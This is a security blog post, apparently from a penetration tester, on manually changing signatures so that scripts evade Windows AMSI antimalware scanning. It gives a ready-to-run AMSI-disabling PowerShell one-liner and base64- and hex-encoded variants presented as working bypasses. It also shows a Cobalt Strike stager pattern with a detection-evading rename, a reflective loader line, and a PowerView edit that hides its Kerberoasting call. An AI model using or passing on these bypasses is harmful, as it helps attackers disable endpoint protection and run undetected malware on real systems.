@@ -1,0 +1,315 @@
+# https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
+
+<!DOCTYPE html><html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true"><body style="word-wrap: break-word;">
+
+<article>
+  
+
+  <p>This is my very first blog post. Its about how to manually change AMSI signatures/triggers to bypass it.
+<!--more--></p>
+<h2 id="introduction">Introduction</h2>
+
+<p>To keep it short the Antimalware Scan Interface (AMSI) is an interface introduced by Microsoft to gain insight into malware that attackers try to load straight into memory. According to <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Microsoft</a>, AMSI is used for the following Windows components:</p>
+
+<ul>
+  <li>User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)</li>
+  <li>PowerShell (scripts, interactive use, and dynamic code evaluation)</li>
+  <li>Windows Script Host (wscript.exe and cscript.exe)</li>
+  <li>JavaScript and VBScript</li>
+  <li>Office VBA macros</li>
+</ul>
+
+<p>There are many blog posts about techniques to bypass AMSI including PoC code. The techniques vary slightly, but mostly the <code class="language-plaintext highlighter-rouge">amsi.dll</code> is manipulated in memory. The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result instead of “malicious”. This can be done by patching the dll in memory or by placing a separate <code class="language-plaintext highlighter-rouge">amsi.dll</code> in the current working directory. If you are interested in more information about AMSI and how the actual bypasses work you can read that for example <a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/">here</a> or <a href="https://www.contextis.com/en/blog/amsi-bypass">here</a>.</p>
+
+<p>Nearly all AMSI bypass PoC code snippets i <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">found</a> so far have been added as a new “signature” or “trigger” a few weeks up to months after the publication, so they do not work anymore without modification. Or at least a part of those code snippets gets flagged.</p>
+
+<p>I did not find many blog posts which explain how to manually find and change the signature/trigger so far. But this is essential to get a bypass work again or to use other tooling without a bypass at all. Therefore i decided to do this in my very first blog post.</p>
+
+<h2 id="the-shortest-bypass">The shortest bypass</h2>
+
+<p>Matt Graeber <a href="https://twitter.com/mattifestation/status/735261120487772160">tweeted</a> this oneliner to bypass amsi in 2016.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'amsiInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This bypass is basically assigning <code class="language-plaintext highlighter-rouge">amsiInitFailed</code> a boolean <code class="language-plaintext highlighter-rouge">True</code> value so that AMSI initialization fails - no scan will be done at all for the current process.</p>
+
+<p>Just executing this oneliner in Powershell results in an <i>This script contains malicious content and has been blocked by your antivirus software</i> message:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/AmsiTrigger.JPG">
+</p>
+
+<p>In this post i will focus on how to find and change the signature/trigger for powershell scripts or C# source code beginning with this bypass PoC from 2016.</p>
+
+<h2 id="why-doing-it-manually-i-can-just-use-obfuscators-and-thats-fine">Why doing it manually? I can just use obfuscators and thats fine!</h2>
+
+<p>To bypass AMSI signatures its possible to use automated obfuscator tools. Alternatively, the code can be modified manually. Using <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> from Daniel Bohannon or <a href="https://www.powershellgallery.com/packages/ISESteroids/2.7.1.7">ISE-Steroids</a> are automated obfuscation approaches for Powershell Scripts. I did not test many comparable open source .NET obfuscator tools so far. But there <a href="https://github.com/NotPrab/.NET-Obfuscator">are</a> a lot of commercial, free and open source .NET obfuscators. For C# binaries i made good experiences with encrypting the script or binary and <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader">decrypting</a> it at runtime using an AMSI bypass before.</p>
+
+<p>If you are using one of the automated obfuscator tools you will save time and if you are lucky the binary works so that the obfuscation did not break the functionality. But Invoke-Obfuscation for example is well known for defenders and a Powershell script obfuscated by it gets most likely <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf">detected</a> in a monitored environment. By manually changing parts of a script or binary its more likely to not get detected. In addition many obfuscators increase the size of binaries a lot. <code class="language-plaintext highlighter-rouge">Invoke-Mimikatz</code> for example has a size of ~3MB because of the embedded base64 encoded Mimikatz binary. Obfuscating <code class="language-plaintext highlighter-rouge">Invoke-Mimikatz</code> with ISE-Steroids makes it ~8MB big because many strings are also base64 encoded here. At least using the automated tools is no guarantee to bypass AMSI.</p>
+
+<p>In order to remain undetected and to bypass AMSI reliably, the manual route can be chosen. You can also do it this way to learn about the code and how AMSI works actually.</p>
+
+<h2 id="how-to-find-the-signaturetrigger">How to find the signature/trigger</h2>
+
+<p>To find the specific string responsible for the AMSI trigger you can take different approaches. At first we will take a look at the simple oneliner from Matt Graeber mentioned above.</p>
+
+<p>If AMSI was a good old AV-Product from 5 years ago it would just have a database containing hashes of scripts/executables which are malicious and check everything loaded against this database. But thats not the case. Its not looking for hashes but for strings like <code class="language-plaintext highlighter-rouge">Invoke-Mimikatz</code>, <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code>, <code class="language-plaintext highlighter-rouge">amsiInitFailed</code>, <code class="language-plaintext highlighter-rouge">AmsiUtils</code> and many many more. So if a script/binary contains one of those strings it gets flagged as malicious and is blocked from loading. The in my personal opinion easiest way to break signatures like this is string concatenation. Lets see how this is done:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/StringConcat.JPG">
+</p>
+
+<p>The strings itself get flagged but a concatenation of string parts is not flagged. Any string can be used by AMSI to trigger a script or binary as malicious. So thats function names, variable names, console output with <code class="language-plaintext highlighter-rouge">Write-Host</code> in Powershell or <code class="language-plaintext highlighter-rouge">Console.Writeline()</code> in C#. So if you want to find strings triggered by AMSI you have to test every single word or line of a script/code after each other. Executing every single word in Powershell is time consuming and annoying especially for large scripts. Importing Amsi.dll and Calling AmsiScanBuffer for each line of code to see if the result is flagged as malicious or not is much better. RythmStick wrote a really usefull tool called <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> which is doing exactly that. If we host our PoC as <a href="https://gist.githubusercontent.com/S3cur3Th1sSh1t/efae7a841e40744aef32ab97d6f9b33a/raw/5534334b7a15faf18546a9b909e9dafbc70dafb3/PoC.ps1">gist</a> and fire AMSITrigger, we get the following result:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/AMSITriggerFind.JPG">
+</p>
+
+<p>So for this PoC we “just” have to change the signature of <code class="language-plaintext highlighter-rouge">AmsiUtils</code> and <code class="language-plaintext highlighter-rouge">amsiInitFailed</code> to get it past AMSI. I will come back to what is working here at the time of writing later.</p>
+
+<p>I dont know if someone else already posted this somewhere but AMSI is still not just flagging strings. If you do string concatenation for Matt Graebers bypass, the script is detected even if the “sub”-strings itself are not. Lets take a look at it:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/PoCConcatenated.JPG">
+</p>
+
+<p>So lets take a deeper look into this. If AMSI is just looking for single strings and blocks them we should be able to identify this string. We are doing that by executing single parts of the oneliner after each other:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/PoCSinglePart.JPG">
+</p>
+
+<p>By adding “SetValu” the script is still not blocked but by adding “SetValue” its blocked:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/PoCBlocked.JPG">
+</p>
+
+<p>We go further and change the values <code class="language-plaintext highlighter-rouge">amsiInitFailed</code> and <code class="language-plaintext highlighter-rouge">NonPublic,Static</code> to something like <code class="language-plaintext highlighter-rouge">asd</code> and remove as much as possible from the <code class="language-plaintext highlighter-rouge">GetType()</code> value the whole script is still blocked. But the first and seccond part still have no trigger:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/PoCNoStringBlock.JPG">
+</p>
+
+<p>This clearly looks like a regex for me. The following regex for example could do this trigger:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/PoCRegex.JPG">
+</p>
+
+<p>There are many more triggers like this one. The <a href="https://offensivedefence.co.uk/posts/making-amsi-jump/">cobalt strike Powershell stager</a> for example contains a regex like trigger which looks like this:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$s<span class="o">=</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">IO</span>.MemoryStream<span class="o">(,[</span><span class="kd">Convert</span><span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s2">"H4sI[...snip...]AA=="</span><span class="o">));</span><span class="kd">IEX</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">IO</span>.StreamReader<span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">IO</span>.Compression.GzipStream<span class="o">(</span>$s<span class="o">,[</span><span class="kd">IO</span>.Compression.CompressionMode<span class="o">]</span>::Decompress<span class="o">)))</span>.ReadToEnd<span class="o">();</span>
+</code></pre></div></div>
+
+<p>However there is a trivial bypass using <code class="language-plaintext highlighter-rouge">$a</code> instead of <code class="language-plaintext highlighter-rouge">$s</code> for the variable name or by using a newline in the middle:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$a<span class="o">=</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">IO</span>.MemoryStream<span class="o">(,[</span><span class="kd">Convert</span><span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s2">"H4sI[...snip...]AA=="</span><span class="o">));</span><span class="kd">IEX</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">IO</span>.StreamReader<span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">IO</span>.Compression.GzipStream<span class="o">(</span>$a<span class="o">,[</span><span class="kd">IO</span>.Compression.CompressionMode<span class="o">]</span>::Decompress<span class="o">)))</span>.ReadToEnd<span class="o">();</span>
+</code></pre></div></div>
+
+<p>My <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack scripts</a> also got flagged by a regex like trigger which flags two lines of every script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $base64binary="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ"
+ $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
+</code></pre></div></div>
+
+<p>But evading triggers like this is really easy. You can just change the <code class="language-plaintext highlighter-rouge">$base64binary</code> variable value to for example <code class="language-plaintext highlighter-rouge">$encodedbinary</code> for every script with the following commands:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">git</span> <span class="kd">clone</span> <span class="kd">https</span>://github.com/S3cur3Th1sSh1t/PowerSharpPack.git
+<span class="nb">cd</span> <span class="kd">PowerSharpPack</span>
+<span class="nb">find</span> ./ <span class="na">-type </span><span class="kd">f</span> <span class="na">-print</span><span class="m">0</span> <span class="o">|</span> <span class="kd">xargs</span> <span class="o">-</span><span class="m">0</span> <span class="kd">sed</span> <span class="na">-i </span><span class="s2">"s/\$base64binary/\$encodedbinary/g"</span>
+</code></pre></div></div>
+
+<p>Most of the scripts should not trigger AMSI afterwards but some still do because the base64 encoded binary has some string triggers. Let´s take another look at the bypass from 2016. We found that the two words <code class="language-plaintext highlighter-rouge">amsiInitFailed</code> and <code class="language-plaintext highlighter-rouge">AmsiUtils</code> are triggers. And there are regex like triggers for the whole oneliner if the two words are concatenated. In this case we cannot just change the words, because if we do that the bypass is not working anymore. But we have many many other options for that.</p>
+
+<p>It´s possible to encode them and that with any encoding you can think of. Base64  - or any other Base, HTML, ASCII or ROT13 encoding. Any number encodings like binary (base 2), hex(base 16), oktal(base 8) - this is an unlimited amount of possibilities. The only thing we obviously have to do is get the correct value for both words back at runtime, so that the bypass stays functional. Base64 encoding/decoding in powershell can be done like this:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="kd">System</span>.Convert<span class="o">]</span>::ToBase64String<span class="o">([</span><span class="kd">System</span>.Text.Encoding<span class="o">]</span>::UNICODE.GetBytes<span class="o">(</span><span class="s2">"AmsiUtils"</span><span class="o">))</span>
+<span class="o">[</span><span class="kd">System</span>.Convert<span class="o">]</span>::ToBase64String<span class="o">([</span><span class="kd">System</span>.Text.Encoding<span class="o">]</span>::UNICODE.GetBytes<span class="o">(</span><span class="s2">"amsiInitFailed"</span><span class="o">))</span>
+</code></pre></div></div>
+
+<p>To get the correct value back at runtime we can use</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$<span class="o">([</span><span class="kd">Text</span>.Encoding<span class="o">]</span>::Unicode.GetString<span class="o">([</span><span class="kd">Convert</span><span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s1">'VALUE'</span><span class="o">)))</span>
+
+</code></pre></div></div>
+
+<p>So if we modify the two trigger words by encoding them base64 and decoding them at runtime we get the following modified script:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="kd">Ref</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s1">'System.Management.Automation.'</span><span class="o">+</span>$<span class="o">([</span><span class="kd">Text</span>.Encoding<span class="o">]</span>::Unicode.GetString<span class="o">([</span><span class="kd">Convert</span><span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s1">'QQBtAHMAaQBVAHQAaQBsAHMA'</span><span class="o">))))</span>.GetField<span class="o">(</span>$<span class="o">([</span><span class="kd">Text</span>.Encoding<span class="o">]</span>::Unicode.GetString<span class="o">([</span><span class="kd">Convert</span><span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s1">'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='</span><span class="o">))),</span><span class="s1">'NonPublic,Static'</span><span class="o">)</span>.SetValue<span class="o">(</span>$null<span class="o">,</span>$true<span class="o">)</span>
+</code></pre></div></div>
+
+<p>By the time of writing this is enough to bypass all triggers, its a valid bypass again. For the fun of pleasure we do the same with HEX values. Getting HEX values for those trigger words goes for example like this:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'AmsiUtils'</span> <span class="o">|</span> <span class="kd">Format</span><span class="na">-Hex
+</span><span class="s1">'amsiInitFailed'</span> <span class="o">|</span> <span class="kd">Format</span><span class="na">-Hex -Encoding </span><span class="kd">utf8</span>
+</code></pre></div></div>
+
+<p>Decoding at runtime and therefore one more valid bypass looks like this:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="kd">Ref</span><span class="o">]</span>.Assembly.GetType<span class="o">(</span><span class="s1">'System.Management.Automation.'</span><span class="o">+</span>$<span class="o">(</span><span class="s2">"41 6D 73 69 55 74 69 6C 73"</span>.Split<span class="o">(</span><span class="s2">" "</span><span class="o">)|</span><span class="kd">forEach</span><span class="o">{[</span><span class="kd">char</span><span class="o">]([</span><span class="nb">convert</span><span class="o">]</span>::toint16<span class="o">(</span>$_<span class="o">,</span><span class="m">16</span><span class="o">))}|</span><span class="kd">forEach</span><span class="o">{</span>$result<span class="o">=</span>$result<span class="o">+</span>$_<span class="o">};</span>$result<span class="o">))</span>.GetField<span class="o">(</span>$<span class="o">(</span><span class="s2">"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"</span>.Split<span class="o">(</span><span class="s2">" "</span><span class="o">)|</span><span class="kd">forEach</span><span class="o">{[</span><span class="kd">char</span><span class="o">]([</span><span class="nb">convert</span><span class="o">]</span>::toint16<span class="o">(</span>$_<span class="o">,</span><span class="m">16</span><span class="o">))}|</span><span class="kd">forEach</span><span class="o">{</span>$result2<span class="o">=</span>$result2<span class="o">+</span>$_<span class="o">};</span>$result2<span class="o">),</span><span class="s1">'NonPublic,Static'</span><span class="o">)</span>.SetValue<span class="o">(</span>$null<span class="o">,</span>$true<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Of course its possible to combine different encoding techniques, concatenation and for example encryption like AES oder 3DES to get a script without trigger. In comparison to encoding, encryption offers the most reliable way of bypassing signatures, since strong crypto algorithms create a very high degree of randomness in the cipher text. But i will leave the combination of encodings and the encryption up to the reader at this point.</p>
+
+<p>Im pretty sure that the two “updated” AMSI bypasses here get flagged in the near future. So if you are lazy but still want to have a valid bypass with a new signature i can recommend the <a href="https://amsi.fail/">amsi.fail</a> project by Flangvik, which is really cool and doing the signature change part for you automagically.</p>
+
+<p>Last but not least what about the other good old stuff is which is still very useful in penetration tests today? Basically the search for the trigger can be done the same way we did it before.</p>
+
+<p>Until today I still use open source powershell projects in most pentests, although there are measures like “constrained language mode”, “AMSI” or “script block logging”. Many companies have implemented only some or none of these measures. If they have been implemented, any script can be run in a C# powershell runspace to bypass the protection mechanisms. I will therefore take as another example a script that has been flagged for a very long time, <code class="language-plaintext highlighter-rouge">Powerview.ps1</code> from the recently archived <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> repository. The first thing we should always do is removing all the comments, i found many triggers for comments in the past. In addition we have less code to load. Its possible to remove them via regex for example but this time im going for it using ISE-Steroids:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/ISE-Steroids_obfuscate.JPG">
+</p>
+
+<p>We are not obfuscating anything here for now, because we want to locate the trigger exactly:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/ISE-Steroids_Remove_Comments.JPG">
+</p>
+
+<p>Now running AMSITrigger for the resulting script reveals the following two lines as regex like trigger:</p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       <span class="k">if</span> <span class="o">(</span>$PSBoundParameters<span class="o">[</span><span class="s1">'Identity'</span><span class="o">])</span> <span class="o">{</span> $UserSearcherArguments<span class="o">[</span><span class="s1">'Identity'</span><span class="o">]</span> <span class="o">=</span> $Identity <span class="o">}</span>
+        <span class="kd">Get</span><span class="na">-DomainUser </span>@UserSearcherArguments <span class="o">|</span> <span class="kd">Where</span><span class="na">-Object </span><span class="o">{</span>$_.samaccountname <span class="na">-ne </span><span class="s1">'krbtgt'</span><span class="o">}</span> <span class="o">|</span> <span class="kd">Get</span><span class="na">-DomainSPNTicket</span><span class="s2">"
+</span></code></pre></div></div>
+
+<p>We get rid of this by just concatenating the <code class="language-plaintext highlighter-rouge">'krbtgt'</code> to <code class="language-plaintext highlighter-rouge">'kr'+'bt'+'gt'</code> and the result is a <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> <a href="https://gist.githubusercontent.com/S3cur3Th1sSh1t/bc105f84e307b5e244425d85ad904e29/raw/c02ac1b0c8e0b166ede1ae1b47c3ba1a6fdeb824/PowerView_No_trigger.ps1">without AMSI trigger</a>.</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/2020-09-02-Bypass_AMSI_by_manual_modification/PowerView_noTrigger.JPG">
+</p>
+
+<p>So what if a function name, variable name or other parts of a script are flagged which cannot be encoded and decoded at runtime. There are several options, i myself prefer to change the name of the function/variable, because here the detection rate is the lowest. <code class="language-plaintext highlighter-rouge">Invoke-Mimikatz</code> for example becomes <code class="language-plaintext highlighter-rouge">CuteLittleKittie</code>. If you do not want to remember a new name, you can also change some of the small to capital letters. In Powershell you can insert backticks like Invoke-Obfuscation does. <code class="language-plaintext highlighter-rouge">InV`OKe-Mim`iKaTz</code> for example has to trigger.</p>
+
+<p>If you want to change the signature for C# source code, changing the class name and function names as well as variable names worked many times for me. The triggers for C# AMSI bypass POCs are mainly the same, <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code>, <code class="language-plaintext highlighter-rouge">amsi.dll</code>, <code class="language-plaintext highlighter-rouge">AmsiUtils</code> and so on. Encoding or encryption with decoding or decryption at runtime works here as well.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>We found out that single words as well as strings can be a trigger for AMSI. In many cases the simple replacement of variable/function names or the encoding of values as well as decoding at runtime is sufficient to bypass the trigger. Some triggers are regex like and therefore harder to find/bypass. However, if a fix part of this regex value is changed, AMSI returns a clean result again. I have made the experience that nowadays every AV vendor builds its own signatures which can be used to identify malware with amsi.dll. Therefore the trigger should be searched and modified for each individual vendor.</p>
+
+<p>Basically no bypass is needed if the trigger itself is modified in the script/binary to be loaded.</p>
+
+<h2 id="whats-next">Whats next?</h2>
+
+<p>This first blog post took much more time than I had initially planned. I welcome any feedback and suggestions for further improvement. You can reach my via  <a href="https://twitter.com/ShitSecure">Twitter</a>, other channels are linked at the top.</p>
+
+<p>I´m pretty sure that i will write more posts in the future.</p>
+
+<h2 id="links--resources">Links &amp; Resources</h2>
+
+<ul>
+  <li>
+    <p>Microsoft AMSI - <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</a></p>
+  </li>
+  <li>
+    <p>F-Secure hunting for AMSI bypasses - <a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/">https://blog.f-secure.com/hunting-for-amsi-bypasses/</a></p>
+  </li>
+  <li>
+    <p>Contextis AMSI bypass blog - <a href="https://www.contextis.com/en/blog/">https://www.contextis.com/en/blog/</a></p>
+  </li>
+  <li>
+    <p>AMSI Bypass Powershell - <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></p>
+  </li>
+  <li>
+    <p>Matt Graeber AMSI Tweet - <a href="https://twitter.com/mattifestation/status/735261120487772160">https://twitter.com/mattifestation/status/735261120487772160</a></p>
+  </li>
+  <li>
+    <p>Invoke-Obfuscation - <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+  </li>
+  <li>
+    <p>ISE-Steroids - <a href="https://www.powershellgallery.com/packages/ISESteroids/2.7.1.7">https://www.powershellgallery.com/packages/ISESteroids/2.7.1.7</a></p>
+  </li>
+  <li>
+    <p>.NET Obfuscators - <a href="https://github.com/NotPrab/.NET-Obfuscator">https://github.com/NotPrab/.NET-Obfuscator</a></p>
+  </li>
+  <li>
+    <p>Invoke-Sharploader - <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader">https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader</a></p>
+  </li>
+  <li>
+    <p>Blackhat Powershell Obfuscation Detection - <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf</a></p>
+  </li>
+  <li>
+    <p>AMSITrigger - <a href="https://github.com/RythmStick/AMSITrigger">https://github.com/RythmStick/AMSITrigger</a></p>
+  </li>
+  <li>
+    <p>making AMSI jump - <a href="https://offensivedefence.co.uk/posts/making-amsi-jump/">https://offensivedefence.co.uk/posts/making-amsi-jump/</a></p>
+  </li>
+  <li>
+    <p>PowerSharpPack - <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">https://github.com/S3cur3Th1sSh1t/PowerSharpPack</a></p>
+  </li>
+  <li>
+    <p>amsi.fail - <a href="https://amsi.fail/">https://amsi.fail/</a></p>
+  </li>
+  <li>
+    <p>PowerSploit - <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+  </li>
+</ul>
+
+  
+</article>
+<article>
+If you like what I'm doing consider --&gt;  <div src="https://github.com/sponsors/S3cur3Th1sSh1t/button" title="Sponsor S3cur3Th1sSh1t" height="35" width="116" style="border: 0;" data-original-tag="iframe">
+    
+  <link rel="dns-prefetch" href="https://github.githubassets.com/">
+  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com/">
+  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com/">
+  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+  <link rel="preconnect" href="https://github.githubassets.com/" crossorigin="">
+  <link rel="preconnect" href="https://avatars.githubusercontent.com/">
+
+  
+  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/sponsors-embed-6a38bcf4216f82d6.css">
+
+
+  
+
+  
+
+  
+  
+
+  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
+  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
+  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">
+
+
+
+
+
+  <link rel="manifest" href="https://github.com/manifest.json" crossorigin="use-credentials">
+
+  
+
+  
+    <div data-turbo-body="" style="word-wrap: break-word;">
+      <div id="__primerPortalRoot__" role="region" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent=""></div>
+      
+  <main>
+    <a href="https://github.com/sponsors/S3cur3Th1sSh1t?o=esb" aria-label="Sponsor @S3cur3Th1sSh1t" target="_top" data-view-component="true" class="Button--secondary Button--medium Button Button--fullWidth">  <span class="Button-content">
+      <span class="Button-visual Button-leadingVisual">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-heart color-fg-sponsors">
+    <path d="m8 14.25.345.666a.75.75 0 0 1-.69 0l-.008-.004-.018-.01a7.152 7.152 0 0 1-.31-.17 22.055 22.055 0 0 1-3.434-2.414C2.045 10.731 0 8.35 0 5.5 0 2.836 2.086 1 4.25 1 5.797 1 7.153 1.802 8 3.02 8.847 1.802 10.203 1 11.75 1 13.914 1 16 2.836 16 5.5c0 2.85-2.045 5.231-3.885 6.818a22.066 22.066 0 0 1-3.744 2.584l-.018.01-.006.003h-.002ZM4.25 2.5c-1.336 0-2.75 1.164-2.75 3 0 2.15 1.58 4.144 3.365 5.682A20.58 20.58 0 0 0 8 13.393a20.58 20.58 0 0 0 3.135-2.211C12.92 9.644 14.5 7.65 14.5 5.5c0-1.836-1.414-3-2.75-3-1.373 0-2.609.986-3.029 2.456a.749.749 0 0 1-1.442 0C6.859 3.486 5.623 2.5 4.25 2.5Z"></path>
+</svg>
+      </span>
+    <span class="Button-label">Sponsor</span>
+  </span>
+</a>
+
+  </main>
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true"></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  
+
+</div> &lt;-- or <a href="https://www.patreon.com/S3cur3Th1sSh1t">become a Patron</a> for a coffee or beer. 
+</article>
+
+  
+
+
+
+
+</body></html>
